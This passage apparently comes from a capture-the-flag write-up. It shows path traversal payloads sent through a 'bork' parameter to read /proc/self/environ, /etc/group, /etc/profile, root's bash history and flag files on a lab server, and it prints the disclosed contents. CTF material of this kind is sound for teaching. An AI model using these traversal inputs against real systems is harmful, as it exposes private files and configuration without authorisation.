<p>bork=../../../../../proc/self/environ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/LESSOPEN=|%20/usr/bin/lesspipe%20%s%EF%BF%BDPYTHONIOENCODING=UTF-8%EF%BF%BDTMUX=/tmp/tmux-1000/default,2791,1%EF%BF%BDMAIL=/var/mail/ctfuser%EF%BF%BDSSH_CLIENT=192.168.0.104%2038572%2022%EF%BF%BDUSER=ctfuser%EF%BF%BDSHLVL=4%EF%BF%BDHOME=/home/ctfuser%EF%BF%BDSSH_TTY=/dev/pts/4%EF%BF%BDLOGNAME=ctfuser%EF%BF%BDEVENT_NOEPOLL=1%EF%BF%BD_=/usr/bin/python%EF%BF%BDXDG_SESSION_ID=9%EF%BF%BDTERM=screen-256color%EF%BF%BDPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games%EF%BF%BDXDG_RUNTIME_DIR=/run/user/1000%EF%BF%BDLANG=en_US.UTF-8%EF%BF%BDLS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:%EF%BF%BDSHELL=/bin/bash%EF%BF%BDLESSCLOSE=/usr/bin/lesspipe%20%s%20%s%EF%BF%BDPWD=/home/ctfuser/Web-300/app%EF%BF%BDSSH_CONNECTION=192.168.0.104%2057282%20192.168.30.121%2022%EF%BF%BDTMUX_PANE=%4%EF%BF%BD</div></pre></td></tr></table></figure></p>
<p>urldecode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/LESSOPEN=| /usr/bin/lesspipe %sï¿½PYTHONIOENCODING=UTF-8ï¿½TMUX=/tmp/tmux-1000/default,2791,1ï¿½MAIL=/var/mail/ctfuserï¿½SSH_CLIENT=192.168.0.104 38572 22ï¿½USER=ctfuserï¿½SHLVL=4ï¿½HOME=/home/ctfuserï¿½SSH_TTY=/dev/pts/4ï¿½LOGNAME=ctfuserï¿½EVENT_NOEPOLL=1ï¿½_=/usr/bin/pythonï¿½XDG_SESSION_ID=9ï¿½TERM=screen-256colorï¿½PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesï¿½XDG_RUNTIME_DIR=/run/user/1000ï¿½LANG=en_US.UTF-8ï¿½LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:ï¿½SHELL=/bin/bashï¿½LESSCLOSE=/usr/bin/lesspipe %s %sï¿½PWD=/home/ctfuser/Web-300/appï¿½SSH_CONNECTION=192.168.0.104 57282 192.168.30.121 22ï¿½TMUX_PANE=%4ï¿½</div></pre></td></tr></table></figure></p>
<p>bork=../../../../../etc/group</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">root:x:0:</div><div class="line">daemon:x:1:</div><div class="line">bin:x:2:</div><div class="line">sys:x:3:</div><div class="line">adm:x:4:syslog,ubuntu</div><div class="line">tty:x:5:</div><div class="line">disk:x:6:</div><div class="line">lp:x:7:</div><div class="line">mail:x:8:</div><div class="line">news:x:9:</div><div class="line">uucp:x:10:</div><div class="line">man:x:12:</div><div class="line">proxy:x:13:</div><div class="line">kmem:x:15:</div><div class="line">dialout:x:20:ubuntu</div><div class="line">fax:x:21:</div><div class="line">voice:x:22:</div><div class="line">cdrom:x:24:ubuntu</div><div class="line">floppy:x:25:ubuntu</div><div class="line">tape:x:26:</div><div class="line">sudo:x:27:ubuntu</div><div class="line">audio:x:29:ubuntu</div><div class="line">dip:x:30:ubuntu</div><div class="line">www-data:x:33:</div><div class="line">backup:x:34:</div><div class="line">operator:x:37:</div><div class="line">list:x:38:</div><div class="line">irc:x:39:</div><div class="line">src:x:40:</div><div class="line">gnats:x:41:</div><div class="line">shadow:x:42:</div><div class="line">utmp:x:43:</div><div class="line">video:x:44:ubuntu</div><div class="line">sasl:x:45:</div><div class="line">plugdev:x:46:ubuntu</div><div class="line">staff:x:50:</div><div class="line">games:x:60:</div><div class="line">users:x:100:</div><div class="line">nogroup:x:65534:</div><div class="line">systemd-journal:x:101:</div><div class="line">systemd-timesync:x:102:</div><div class="line">systemd-network:x:103:</div><div class="line">systemd-resolve:x:104:</div><div class="line">systemd-bus-proxy:x:105:</div><div class="line">input:x:106:</div><div class="line">crontab:x:107:</div><div class="line">syslog:x:108:</div><div class="line">netdev:x:109:ubuntu</div><div class="line">lxd:x:110:ubuntu</div><div class="line">messagebus:x:111:</div><div class="line">uuidd:x:112:</div><div class="line">mlocate:x:113:</div><div class="line">ssh:x:114:</div><div class="line">admin:x:115:</div><div class="line">ubuntu:x:1000:</div><div class="line">docker:x:116:ubuntu</div><div class="line">ctfuser:x:1001:</div></pre></td></tr></table></figure>
<p>bork=../../../../../etc/issue : <code>Ubuntu 16.04.1 LTS \n \l</code></p>
<p>bork=../../../../../proc/version : <code>Linux version 4.4.0-47-generic (buildd@lcy01-03) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.2) ) #68-Ubuntu SMP Wed Oct 26 19:39:52 UTC 2016</code></p>
<p>bork=../../../../../etc/profile :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&quot;# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))</div><div class="line"># and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).</div><div class="line"></div><div class="line">if [ &amp;#34;$PS1&amp;#34; ]; then</div><div class="line">  if [ &amp;#34;$BASH&amp;#34; ] &amp;amp;&amp;amp; [ &amp;#34;$BASH&amp;#34; != &amp;#34;/bin/sh&amp;#34; ]; then</div><div class="line">    # The file bash.bashrc already sets the default PS1.</div><div class="line">    # PS1=&amp;#39;\h:\w\$ &amp;#39;</div><div class="line">    if [ -f /etc/bash.bashrc ]; then</div><div class="line">      . /etc/bash.bashrc</div><div class="line">    fi</div><div class="line">  else</div><div class="line">    if [ &amp;#34;`id -u`&amp;#34; -eq 0 ]; then</div><div class="line">      PS1=&amp;#39;# &amp;#39;</div><div class="line">    else</div><div class="line">      PS1=&amp;#39;$ &amp;#39;</div><div class="line">    fi</div><div class="line">  fi</div><div class="line">fi</div><div class="line"></div><div class="line">if [ -d /etc/profile.d ]; then</div><div class="line">  for i in /etc/profile.d/*.sh; do</div><div class="line">    if [ -r $i ]; then</div><div class="line">      . $i</div><div class="line">    fi</div><div class="line">  done</div><div class="line">  unset i</div><div class="line">fi</div></pre></td></tr></table></figure>
<p>bork=../../../../../root/.bash_history : youtube video</p>
<p>bork=../../../../../var/log/dmessage : No such file or directory</p>
<p>bork=../../../../../var/mail/root : No such file or directory</p>
<p>bork=../../../../../var/spool/cron/crontabs/root : Permission denied</p>
<p>bork=../../../../../home/ctfuser/flag.txt : No such file or directory</p>
<p>bork=../../../../../home/ctfuser/Web-300/app/.htaccess : youtube video</p>
<p>bork=../../../../../home/ctfuser/Web-300/app/flag.txt : youtube video</p>
<p>bork=../../../../../usr/bin/lesspipe :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div></pre></td><td class="code"><pre><div class="line">#!/bin/sh</div><div class="line">#</div><div class="line"># lessfile/lesspipe</div><div class="line"># $Id: lessopen,v 1.4 1998/05/12 09:37:46 torin Exp $</div><div class="line"># Plus POSIX sh changes by Y.Dirson</div><div class="line">#</div><div class="line"># Less filter for viewing non text files.</div><div class="line">#</div><div class="line"># Written by: Behan Webster &amp;lt;behanw@pobox.com&amp;gt;</div><div class="line"># Many Modifications by Darren Stalder</div><div class="line"># Further Modifications by Thomas Schoepf &amp;lt;schoepf@debian.org&amp;gt;</div><div class="line">#</div><div class="line"># combined lessfile and lesspipe to avoid duplication of decode stage</div><div class="line"># shell is sure icky.  I&amp;#39;m real tempted to rewrite the whole thing in Perl</div><div class="line">#</div><div class="line"># Unfortunately, this means that I have filename dependencies sprinkled</div><div class="line"># throughout the code.  If you don&amp;#39;t want lessfile to be called that,</div><div class="line"># you&amp;#39;ll need to change the LESSFILE envar below.</div><div class="line">#</div><div class="line"># Usage: eval `lessfile`  or eval `lesspipe`</div><div class="line">#</div><div class="line"># less passes in:</div><div class="line">#    $1  filename to be viewed with less  (used by LESSOPEN)</div><div class="line"># and possibly (if used by lessfile)</div><div class="line">#    $2  filename that was created during LESSOPEN</div><div class="line"></div><div class="line">TMPDIR=$&#123;TMPDIR:-/tmp&#125;</div><div class="line">BASENAME=`basename $0`</div><div class="line">LESSFILE=lessfile</div><div class="line"></div><div class="line"># Helper function to list contents of ISO files (CD images)</div><div class="line">iso_list() &#123;</div><div class="line">	isoinfo -d -i &amp;#34;$1&amp;#34;</div><div class="line">	isoinfo -d -i &amp;#34;$1&amp;#34; | grep -q ^Rock\.Ridge &amp;amp;&amp;amp; iiopts=&amp;#34;$iiopts -R&amp;#34;</div><div class="line">	isoinfo -d -i &amp;#34;$1&amp;#34; | grep -q ^Joliet &amp;amp;&amp;amp; iiopts=&amp;#34;$iiopts -J&amp;#34;</div><div class="line">	echo</div><div class="line">	isoinfo -f $iiopts -i &amp;#34;$1&amp;#34;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if [ $# -eq 1 ] ; then</div><div class="line">	# we were called as LESSOPEN</div><div class="line"></div><div class="line">	# if the file doesn&amp;#39;t exist, we don&amp;#39;t do anything</div><div class="line">	if [ ! -r &amp;#34;$1&amp;#34; ]; then</div><div class="line">		exit 0</div><div class="line">	fi</div><div class="line"></div><div class="line">	# generate filename for possible use by lesspipe</div><div class="line">	umask 077</div><div class="line">	if [ $BASENAME = $LESSFILE ]; then</div><div class="line">		TMPFILE=`tempfile -d $TMPDIR -p lessf`</div><div class="line">		if [ -z &amp;#34;$TMPFILE&amp;#34; ]; then</div><div class="line">			echo &amp;gt;&amp;amp;2 &amp;#34;Could not find essential program &amp;#39;tempfile&amp;#39;. Exiting&amp;#34;</div><div class="line">      exit 1</div><div class="line">		fi</div><div class="line">	fi</div><div class="line"></div><div class="line">	(</div><div class="line">		# possibly redirect stdout to a file for lessfile</div><div class="line">		if [ $BASENAME = $LESSFILE ]; then exec &amp;gt; $TMPFILE; fi</div><div class="line"></div><div class="line">		# Allow for user defined filters</div><div class="line">		#if [ -x ~/.lessfilter -a -O ~/.lessfilter ]; then</div><div class="line">		if [ -x ~/.lessfilter ]; then</div><div class="line">			~/.lessfilter &amp;#34;$1&amp;#34;</div><div class="line">			if [ $? -eq 0 ]; then</div><div class="line">				if [ $BASENAME = $LESSFILE ]; then</div><div class="line">					if [ -s $TMPFILE ]; then</div><div class="line">						echo $TMPFILE</div><div class="line">					else</div><div class="line">						rm -f $TMPFILE</div><div class="line">					fi</div><div class="line">				fi</div><div class="line">				exit 0</div><div class="line">			fi</div><div class="line">		fi</div><div class="line"></div><div class="line">		# Decode file for less</div><div class="line">		case `echo &amp;#34;$1&amp;#34; | tr &amp;#39;[:upper:]&amp;#39; &amp;#39;[:lower:]&amp;#39;` in</div><div class="line">			*.a)</div><div class="line">				if [ -x &amp;#34;`which ar`&amp;#34; ]; then ar tv &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;No ar available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.arj)</div><div class="line">				if [ -x &amp;#34;`which unarj`&amp;#34; ]; then unarj l &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;No unarj available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.tar.bz2)</div><div class="line">				if [ -x &amp;#34;`which bunzip2`&amp;#34; ]; then</div><div class="line">					bunzip2 -dc &amp;#34;$1&amp;#34; | tar tvvf -</div><div class="line">				else echo &amp;#34;No bunzip2 available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.bz)</div><div class="line">				if [ -x &amp;#34;`which bunzip`&amp;#34; ]; then bunzip -c &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;No bunzip available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.bz2)</div><div class="line">				if [ -x &amp;#34;`which bunzip2`&amp;#34; ]; then bunzip2 -dc &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;No bunzip2 available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.deb|*.udeb|*.ddeb|*.ipk)</div><div class="line">				echo &amp;#34;$1:&amp;#34;; dpkg --info &amp;#34;$1&amp;#34;</div><div class="line">				echo</div><div class="line">				echo &amp;#39;*** Contents:&amp;#39;; dpkg-deb --contents &amp;#34;$1&amp;#34;</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.doc)</div><div class="line">				if [ -x &amp;#34;`which catdoc`&amp;#34; ]; then</div><div class="line">					catdoc &amp;#34;$1&amp;#34;</div><div class="line">				else</div><div class="line">					# no catdoc, read normally if file is text.</div><div class="line">					if ( file &amp;#34;$1&amp;#34; | grep ASCII 2&amp;gt;/dev/null &amp;gt;/dev/null); then</div><div class="line">						cat &amp;#34;$1&amp;#34;</div><div class="line">					else</div><div class="line">						echo &amp;#34;No catdoc available&amp;#34;;</div><div class="line">					fi</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.gif|*.jpeg|*.jpg|*.pcd|*.png|*.tga|*.tiff|*.tif)</div><div class="line">				if [ -x &amp;#34;`which identify`&amp;#34; ]; then</div><div class="line">					identify &amp;#34;$1&amp;#34;</div><div class="line">				else</div><div class="line">					echo &amp;#34;No identify available&amp;#34;</div><div class="line">					echo &amp;#34;Install ImageMagick to browse images&amp;#34;</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.iso)</div><div class="line">				if [ -x &amp;#34;`which isoinfo`&amp;#34; ]; then iso_list &amp;#34;$1&amp;#34;</div><div class="line">				else</div><div class="line">					echo &amp;#34;No isoinfo available&amp;#34;</div><div class="line">					echo &amp;#34;Install mkisofs to view ISO images&amp;#34;</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.bin|*.raw)</div><div class="line">				if [ -x &amp;#34;`which isoinfo`&amp;#34; ]; then</div><div class="line">					file &amp;#34;$1&amp;#34; | grep -q ISO\.9660 &amp;amp;&amp;amp; iso_list &amp;#34;$1&amp;#34;</div><div class="line">				else</div><div class="line">					echo &amp;#34;No isoinfo available&amp;#34;</div><div class="line">					echo &amp;#34;Install mkisofs to view ISO images&amp;#34;</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.lha|*.lzh)</div><div class="line">				if [ -x &amp;#34;`which lha`&amp;#34; ]; then lha v &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;No lha available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.tar.lz|*.tlz)</div><div class="line">				if [ -x &amp;#34;`which lzip`&amp;#34; ]; then</div><div class="line">					lzip -dc &amp;#34;$1&amp;#34; | tar tvvf -</div><div class="line">				elif [ -x &amp;#34;`which lunzip`&amp;#34; ]; then</div><div class="line">					lunzip -dc &amp;#34;$1&amp;#34; | tar tvvf -</div><div class="line">				else echo &amp;#34;No lzip or lunzip available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.lz)</div><div class="line">				if [ -x &amp;#34;`which lzip`&amp;#34; ]; then lzip -dc &amp;#34;$1&amp;#34;</div><div class="line">				elif [ -x &amp;#34;`which lunzip`&amp;#34; ]; then lunzip -dc &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;No lzip or lunzip available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.tar.lzma)</div><div class="line">				if [ -x &amp;#34;`which lzma`&amp;#34; ]; then</div><div class="line">					lzma -dc &amp;#34;$1&amp;#34; | tar tfvv -</div><div class="line">				else</div><div class="line">					echo &amp;#34;No lzma available&amp;#34;</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.lzma)</div><div class="line">				if [ -x &amp;#34;`which lzma`&amp;#34; ]; then</div><div class="line">					lzma -dc &amp;#34;$1&amp;#34;</div><div class="line">				else</div><div class="line">					echo &amp;#34;No lzma available&amp;#34;</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.pdf)</div><div class="line">				if [ -x &amp;#34;`which pdftotext`&amp;#34; ]; then pdftotext -layout &amp;#34;$1&amp;#34; -</div><div class="line">				else echo &amp;#34;No pdftotext available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.rar|*.r[0-9][0-9])</div><div class="line">				if [ -x &amp;#34;`which rar`&amp;#34; ]; then rar v &amp;#34;$1&amp;#34;</div><div class="line">				elif [ -x &amp;#34;`which unrar`&amp;#34; ]; then unrar v &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;No rar or unrar available&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.rpm)</div><div class="line">				if [ -x &amp;#34;`which rpm`&amp;#34; ]; then</div><div class="line">					echo &amp;#34;$1:&amp;#34;; rpm -q -i -p &amp;#34;$1&amp;#34;</div><div class="line">					echo</div><div class="line">					echo &amp;#39;*** Contents:&amp;#39;</div><div class="line">					rpm -q -l -p &amp;#34;$1&amp;#34;</div><div class="line">				else echo &amp;#34;rpm isn&amp;#39;t available, no query on rpm package possible&amp;#34;; fi ;;</div><div class="line"></div><div class="line">			*.tar.gz|*.tgz|*.tar.z|*.tar.dz)</div><div class="line">				tar tzvf &amp;#34;$1&amp;#34; --force-local</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.tar.xz|*.txz)</div><div class="line">				if [ -x &amp;#34;`which xz`&amp;#34; ]; then</div><div class="line">					xz -dc &amp;#34;$1&amp;#34; | tar tfvv -</div><div class="line">				else</div><div class="line">					echo &amp;#34;No xz available&amp;#34;</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			*.xz)</div><div class="line">				if [ -x &amp;#34;`which xz`&amp;#34; ]; then</div><div class="line">					xz -dc &amp;#34;$1&amp;#34;</div><div class="line">				else</div><div class="line">					echo &amp;#34;No xz available&amp;#34;</div><div class="line">				fi</div><div class="line">				;;</div><div class="line"></div><div class="line">			# Note that this is out of alpha order so that we don&amp;#39;t catch</div><div class="line">			# the gzipped tar files.</div><div class="line">			*.gz|*.z|*.dz)</div><div class="line">				gzip -dc &amp;#34;$1&amp;#34; ;;</div><div class="line"></div><div class="line">			*.tar)</div><div class="line">				tar tvf &amp;#34;$1&amp;#34; --force-local</div><div 